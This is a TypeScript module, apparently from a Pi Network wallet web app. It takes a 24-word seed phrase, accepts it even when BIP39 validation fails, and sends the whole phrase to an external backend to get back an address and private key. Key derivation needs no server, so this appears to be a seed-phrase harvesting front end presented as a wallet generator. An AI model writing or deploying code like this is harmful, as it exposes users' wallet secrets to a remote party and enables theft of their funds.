
import * as bip39 from "bip39";
import { generatePiWalletBackend } from "./api";

// Add Buffer polyfill for browser environment (still needed for validation)
import { Buffer } from 'buffer';

// Make Buffer globally available for validation
window.Buffer = Buffer;

/**
 * Validates a mnemonic phrase (seed phrase)
 */
export const validateMnemonic = (mnemonic: string): boolean => {
  // Clean up the mnemonic by removing extra spaces and making it consistent
  const cleanedMnemonic = mnemonic.trim().toLowerCase().replace(/\s+/g, ' ');
  
  // Check if it's 24 words
  const words = cleanedMnemonic.split(' ');
  if (words.length !== 24) {
    console.log(`Seed phrase contains ${words.length} words, expected 24`);
    return false;
  }
  
  try {
    // Try standard BIP39 validation
    const isValid = bip39.validateMnemonic(cleanedMnemonic);
    if (!isValid) {
      console.log("Seed phrase failed BIP39 validation, but we'll try to use it anyway");
    }
    return true; // Accept it even if it fails BIP39 validation as long as it's 24 words
  } catch (error) {
    console.error("Error validating mnemonic:", error);
    return false;
  }
};

/**
 * Generates a Pi wallet (address and private key) from a mnemonic phrase
 * by calling the external backend service API
 */
export const generatePiWallet = async (mnemonic: string): Promise<{
  piAddress: string;
  publicKey: string;
  privateKey: string;
}> => {
  const cleanedMnemonic = mnemonic.trim().toLowerCase().replace(/\s+/g, ' ');
  
  if (!validateMnemonic(cleanedMnemonic)) {
    throw new Error("Invalid mnemonic phrase! Please check your 24 words and try again.");
  }

  try {
    // Call our backend service API
    console.log("Sending seed phrase to backend service for wallet generation");
    const walletData = await generatePiWalletBackend(cleanedMnemonic);
    
    console.log("Successfully received wallet data from backend");
    
    return {
      piAddress: walletData.piAddress,
      publicKey: walletData.publicKey,
      privateKey: walletData.privateKey,
    };
  } catch (error) {
    console.error("Error generating wallet from seed:", error);
    throw new Error(`Failed to generate wallet: ${error instanceof Error ? error.message : 'Unknown error'}`);
  }
};
